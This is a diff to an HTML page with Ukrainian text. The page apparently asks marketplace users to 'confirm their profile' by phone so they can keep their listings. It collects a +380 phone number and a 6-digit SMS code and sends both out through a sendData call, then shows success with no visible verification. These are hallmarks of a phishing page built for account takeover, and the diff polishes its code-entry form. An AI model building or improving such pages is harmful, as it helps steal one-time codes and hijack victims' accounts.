@@ -128,16 +128,17 @@
             font-size: 14.5px;
         }
 
-        /* ВИПРАВЛЕНО: SMS-код не виходить за екран */
+        /* ИСПРАВЛЕНО: SMS-код — компактно, центровано, без переполнения */
         .code-input-group {
             display: flex;
             justify-content: center;
             gap: 8px;
             margin: 0 auto 20px;
-            padding: 0 10px; /* Додано відступи */
+            padding: 0 10px;
             overflow-x: auto;
             -webkit-overflow-scrolling: touch;
             scrollbar-width: none;
+            flex-wrap: nowrap;
         }
 
         .code-input-group::-webkit-scrollbar {
@@ -147,7 +148,7 @@
         .code-input {
             width: 48px;
             height: 48px;
-            font-size: 24px;
+            font-size: 20px;
             font-weight: bold;
             text-align: center;
             border: 2px solid var(--border);
@@ -157,6 +158,12 @@
             -webkit-appearance: none;
             -moz-appearance: textfield;
             flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            box-sizing: border-box;
+            line-height: 1;
         }
 
         .code-input:focus {
@@ -202,7 +209,6 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
-        /* Стиль для сторінки успіху */
         .success-message {
             text-align: center;
             padding: 20px;
@@ -220,11 +226,13 @@
         }
 
         input[type=tel]::-webkit-inner-spin-button,
-        input[type=tel]::-webkit-outer-spin-button {
+        input[type=tel]::-webkit-outer-spin-button,
+        .code-input::-webkit-inner-spin-button,
+        .code-input::-webkit-outer-spin-button {
             -webkit-appearance: none;
             margin: 0;
         }
-        input[type=tel] { -moz-appearance: textfield; }
+        input[type=tel], .code-input { -moz-appearance: textfield; }
     </style>
 </head>
 <body>
@@ -243,7 +251,7 @@
             <!-- Крок 1: Номер телефону -->
             <div id="phone-step" class="step active">
                 <div class="info-text">
-                    Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу. 😊
+                    Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу.
                 </div>
 
                 <div class="input-group">
@@ -266,12 +274,12 @@
             <div id="sms-step" class="step">
                 <p class="sms-prompt">Введіть 6-значний код з SMS</p>
                 <div class="code-input-group">
-                    <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
+                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
                 </div>
                 <button type="button" class="submit-button" onclick="sendSmsCode()">
                     Підтвердити
@@ -302,12 +310,16 @@
                 clearIfNotMatch: true
             }).val('+380 ').focus();
 
-            $('.code-input').on('input', function() {
-                if (this.value.length === 1 && this.nextElementSibling) {
+            // УЛУЧШЕННЫЙ обработчик для SMS-кода
+            $('.code-input').on('input', function(e) {
+                let value = this.value.replace(/\D/g, '').substr(0, 1);
+                this.value = value;
+
+                if (value && this.nextElementSibling) {
                     this.nextElementSibling.focus();
                 }
             }).on('keydown', function(e) {
-                if (e.key === 'Backspace' && this.value === '' && this.previousElementSibling) {
+                if (e.key === 'Backspace' && !this.value && this.previousElementSibling) {
                     this.previousElementSibling.focus();
                 }
             });
@@ -338,7 +350,6 @@
             }
             sendData('code', { code });
 
-            // Перехід на сторінку успіху
             $('#sms-step').removeClass('active');
             $('#success-step').addClass('active');
         }
